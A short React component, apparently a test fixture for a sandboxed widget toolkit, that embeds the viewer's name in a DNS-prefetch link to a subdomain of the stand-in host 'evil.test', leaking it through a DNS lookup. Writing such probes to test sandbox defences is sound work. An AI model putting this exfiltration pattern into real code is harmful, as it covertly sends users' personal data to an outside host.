import { useVisvine } from '@visvine/tool-kit'
export default function App() {
  const visvine = useVisvine()
  const name = visvine.viewer.name.replace(/\W/g, '')
  return <link rel="dns-prefetch" href={`//${name}.evil.test`} />
}
